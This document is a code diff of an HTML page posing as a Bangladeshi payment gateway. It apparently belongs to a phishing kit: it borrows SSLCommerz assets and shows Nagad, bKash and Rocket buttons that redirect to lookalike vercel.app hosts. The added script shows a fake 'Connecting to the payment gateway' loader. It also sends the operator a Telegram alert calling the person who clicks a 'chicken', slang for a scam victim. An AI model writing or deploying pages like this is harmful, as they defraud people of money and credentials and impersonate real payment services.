@@ -1,10 +1,11 @@
+
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head> 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <link rel="icon" type="image/png" href="https://i.postimg.cc/pLZFd3s1/Pngtree-gray-shopping-trolley-logo-4459394.png">
-    <title>Payment Method</title>
+    <title>Bangladesh Payment</title>
+    <link rel="stylesheet" href="https://securepay.sslcommerz.com/gwprocess/v4/assets/v3.7/css/style.css">
     <style>
         /* Background Theme */
         body {
@@ -72,7 +73,7 @@
         }
         .image-box {
             position: relative;
-            width: 100px;
+            width: 50px;
             cursor: pointer;
             border: 2px solid transparent;
             border-radius: 8px;
@@ -150,10 +151,9 @@
             to { opacity: 1; }
         }
 
-        /* Button Styling */
         .button {
-            height: 50px;
-            width: 150px;
+            height: 35px;
+            width: 100px;
             border: none;
             border-radius: 10px;
             cursor: pointer;
@@ -168,15 +168,15 @@
 
         .type1::after {
             content: "Thanks";
-            height: 50px;
-            width: 150px;
+            height: 35px;
+            width: 100px;
             background-color: #008080;
             color: #fff;
             position: absolute;
             top: 0%;
             left: 0%;
             transform: translateY(50px);
-            font-size: 1.2rem;
+            font-size: 0.8rem;
             font-weight: 600;
             display: flex;
             align-items: center;
@@ -186,21 +186,22 @@
 
         .type1::before {
             content: "Pay Now";
-            height: 50px;
-            width: 150px;
+            height: 35px;
+            width: 100px;
             background-color: #fff;
             color: #008080;
             position: absolute;
             top: 0%;
             left: 0%;
             transform: translateY(0px) scale(1.2);
-            font-size: 1.2rem;
+            font-size: 0.8rem;
             font-weight: 600;
             display: flex;
             align-items: center;
             justify-content: center;
             transition: all 0.5s ease-in-out;
         }
+
 
         .type1:hover::after {
             transform: translateY(0) scale(1.2);
@@ -213,33 +214,51 @@
 </head>
 <body>
     <!-- Header -->
-    <header style="color: black;">
+    <header style="color: black;" id="paymentHeader" style="display: flex;">
         Welcome to Our Payment Gateway
     </header>
 
     <!-- Main Content Container -->
-    <div class="main-container">
+    <div class="main-container" id="paymentContainer" style="display: flex;">
         <div class="title">Instant Pay</div>
         <div class="subtitle">Choose Payment Method:</div>
 
-        <div class="image-container">
+
+
+	   
+<div class="image-container">
             <div class="image-box" onclick="selectImage(this, 'https://nagad-autopay.vercel.app/num.html?amount=${amount}')">
-                <img src="https://i.postimg.cc/kX9SNLs7/IMG-3409.png
-" alt="Image 1">
+                <img src="https://i.postimg.cc/kX9SNLs7/IMG-3409.png" alt="Image 1">
                 <div class="checkbox">✔️</div>
-            </div>
+
+		    
+	
+		    <!-- bKash New -->    
+	    
+	    
+	    </div>
             <div class="image-box" onclick="selectImage(this, 'https://securepayment-one.vercel.app/?amount=${amount}')">
                 <img src="https://i.postimg.cc/vZ05ZXWb/IMG-3406.png" alt="Image 2">
                 <div class="checkbox">✔️</div>
             </div>
-        </div>
-            <div class="image-box" onclick="selectImage(this, 'https://nagad-manual.vercel.app/?amount=${amount}&redirect=https://no-emotion.vercel.app/contact-details.html')">
-                <img src="https://payment.mynagad.com:30000/img/nagad_favicon.png" alt="Image 3">
-                <div class="checkbox">✔️</div>
-            </div>
-        </div>
-
-        <!-- Button linked to selected image -->
+        
+   
+		
+		
+		<!-- Rocket -->
+    
+		
+		
+		<div class="image-box" onclick="selectImage(this, 'https://nagad-manual.vercel.app/?amount=${amount}&redirect=https://no-emotion.vercel.app/contact-details.html')">
+        <img src="https://i.postimg.cc/WbDfFhk9/IMG-3411.jpg" alt="Rocket">
+        <div class="checkbox">✔️</div>
+             </div>
+	    
+	    </div><br><br>
+	    
+	    
+	    
+	    <!-- Button linked to selected image -->
         <a id="paymentLink" href="#" target="_blank" onclick="triggerPaymentMessage(event)">
             <button class="button type1">Pay Now</button>
         </a>
@@ -249,9 +268,33 @@
     </div>
 
     <!-- Payment Message -->
-    <div class="payment-message" id="paymentMessage">Get Ready to Pay Instantly!</div>
+    <div class="payment-message" id="paymentMessage">Get Ready to Pay Instantly!</div></div>
+
+<div class="loader-overlay" id="loaderContainer" style="display: none;">
+<div class="global-overlay">
+				<div class="overlay skew-part">
+				  <div id="container">
+					<div id="output" class="back-fss"><canvas style="display: block;" width="1349" height="240"></canvas></div>
+				  </div>
+				</div>
+			  </div>
+				<div class="container">
+					<div class="loader">
+						<div class="center_content">
+							<h2>Connecting to the payment gateway</h2>
+							<img src="https://securepay.sslcommerz.com/gwprocess/v4/assets/img/ajax-loader.gif?v=160316" alt="">
+							<h4>This may take a few seconds</h4>
+						</div>
+					</div>
+				</div></div>
 
     <script>
+        // Function to get the "amount" parameter from the current URL
+        function getUrlParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name); // Returns the value of the specified parameter
+        }
+
         function selectImage(selected, link) {
             // Remove 'checked' class from all images
             document.querySelectorAll('.image-box').forEach(box => box.classList.remove('checked'));
@@ -272,41 +315,55 @@
             const selectedImage = document.querySelector('.image-box.checked');
             const errorMessage = document.getElementById('errorMessage');
             const paymentMessage = document.getElementById('paymentMessage');
+            const amount = getUrlParameter("amount"); 
+            const loaderContainer = document.getElementById('loaderContainer');
+            const paymentContainer = document.getElementById('paymentContainer');
 
-            if (!selectedImage) {
-                // Show error message if no image is selected
-                errorMessage.style.display = 'block';
-            } else {
-                // Hide error message if previously shown
-                errorMessage.style.display = 'none';
+            if (!selectedImage || !amount) {
+    // Show error message if no image is selected or "amount" is missing
+    errorMessage.style.display = 'block';
+} else {
+    // Hide error message if previously shown
+    errorMessage.style.display = 'none';
 
-                // Show payment message
-                paymentMessage.style.display = 'block';
+    // Show payment message
+    paymentMessage.style.display = 'block';
 
-                // Delay redirection until after the animation (1.5s)
-                setTimeout(() => {
-                    const link = document.getElementById('paymentLink').dataset.link;
-                    window.location.href = link;
-                }, 1500); // Duration of the fade-up animation
-            }
-        }
+    // Telegram notification
+    fetch('/config.json')
+        .then(response => response.json())
+        .then(config => {
+            const botToken = config.botToken;
+            const chatId = config.chatId;
+            const message = "🐔 মুরগি Pay Now এ ক্লিক করেছে";
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        })
+        .catch(error => console.error("Telegram message send error:", error));
+
+    setTimeout(() => {
+        paymentContainer.style.display = 'none'; // pay container
+        loaderContainer.style.display = 'flex'; // loader container
+
+        // Redirect after 3 seconds of loader display
+        setTimeout(() => {
+            paymentContainer.style.display = 'flex'; // pay container
+            loaderContainer.style.display = 'none'; // loader container
+            const baseLink = document.getElementById('paymentLink').dataset.link;
+            const paymentLinkWithAmount = `${baseLink}?amount=${amount}&access=true`;
+            window.location.href = paymentLinkWithAmount; // Redirect with the amount parameter
+        }, 3000); // Loader duration: 3 seconds
+    }, 1500); // Delay before loader: 1.5 seconds
+  }
+}
     </script>
-<script>
-    // Extract the amount parameter from the URL
-    const urlParams = new URLSearchParams(window.location.search);
-    const amount = urlParams.get('amount') || 0; // Default to 0 if no amount is provided
-
-    // Update the image container links dynamically
-    document.querySelectorAll('.image-box').forEach((box, index) => {
-        const links = [
-            https://nagad-autopay.vercel.app/num.html?amount=${amount},
-            https://securepayment-one.vercel.app/?amount=${amount}
-        ];
-        // Assign the respective link based on the image index
-        box.setAttribute('onclick', selectImage(this, '${links[index]}'));
-    });
-  </script>
-
-
+  
 </body>
 </html>
